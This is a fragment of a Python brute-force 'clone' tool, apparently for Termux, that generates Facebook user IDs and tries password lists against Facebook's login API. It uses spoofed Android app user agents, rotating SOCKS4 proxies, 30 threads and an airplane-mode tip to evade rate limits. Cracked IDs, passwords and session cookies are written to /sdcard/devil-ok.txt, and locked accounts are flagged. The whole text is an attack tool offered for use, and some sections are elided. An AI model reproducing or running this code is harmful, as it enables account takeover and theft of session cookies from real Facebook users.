...
\033[1;32m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}≈{G1}]{G1} 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 {A}➢{G1} AKASH 𝐒𝐄𝐊𝐇
{G1}[{A}≈{G1}]{G1} 𝐓𝐎𝐎𝐋𝐒 𝐅𝐎𝐑 {A}➢{G1} 𝐅𝐈𝐋𝐄{X5}:{G2}𝐑𝐀𝐍𝐃𝐎𝐌
{G1}[{A}≈{G1}]{G1} 𝐕𝐄𝐑𝐒𝐈𝐎𝐍   {A}➢{G1} 𝐕{X5}/{G2}1.2
{G1}[{A}≈{G1}]{G1} 𝐒𝐓𝐀𝐓𝐔𝐒    {A}➢{M} 𝐏𝐀𝐈𝐃
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#__________________MAIN____________#
def menu():
    clear()
    print(f'{G1}[{A}1{G1}]{G1} 𝐅𝐈𝐋𝐄 𝐂𝐋𝐎𝐍𝐄 ')
    print(f'{G1}[{A}2{G1}]{G1} 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐋𝐎𝐍𝐄 ')
    print(f'{G1}[{A}3{G1}]{G1} 𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐎𝐖𝐍𝐄𝐑 ')
    print(f'{G1}[{A}0{G1}]{G1} 𝐄𝐗𝐈𝐓 ')
    linex()
    sex = input(f'{G1}[{A}?{G1}]{G1} 𝐂𝐇𝐎𝐈𝐂𝐄 {A}➢{G1} ')
    if sex in ['1']:
        file()
    elif sex in ['2']:
        broken()
...
def bd():
    ...
    with ThreadPool(max_workers=30) as sexy:
        ...
        print(f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}5{G1} MIN");linex()
        for love in user:
            ids = code + love
            ax = ids[:8]
            bx = ids[:7]
...
def randm(ids,psd):
    ...
    sys.stdout.write(f'\r\r{M}[{G1}AKASH:𝐗𝐃{M}]-{M}[{G1}{loop}{M}]-{M}[{G1}OK{M}:{G1}{len(ok)}{M}] ')
    sys.stdout.flush()
    try:
        for pas in psd:
            data = {
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                	print(f'\r\r{A}[{G1}AKASH-𝐎𝐊💚{A}]{G1} {uid} {A}|{G1} {pas}');open('/sdcard/devil-ok.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
                	print(f'\r\r{A}[{S}AKASH-𝐂𝐏💔{A}]{S} {uid} {A}|{S} {pas}');break
            else:continue
        loop+=1
    except Exception as e:
        pass
...
def M1(ids,names,psd):
    global loop,ok
    ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=1.5,width=480,height=854};FBLC/Grameenphone;FBCR/Etisalat NG;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO-W3;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    nip=random.choice(prox)
    proxs= {'http': 'socks4://'+nip}
    sys.stdout.write(f'\r\r{M}[{G1}AKASH:𝐗𝐃{M}]-{M}[{G1}{loop}{M}]-{M}[{G1}OK{M}:{G1}{len(ok)}{M}] ')
    sys.stdout.flush()
    try:
        ...
        for pw in psd:
            ...
            if 'access_token' in po:
                print(f'\r\r{A}[{G1}AKASH-𝐎𝐊💚{A}]{G1} {ids} {A}|{G1} {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open('/sdcard/devil-ok.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{A}[{M}AKASH-𝐂𝐏💔{A}]{M} {ids} {A}|{M} {pas}')
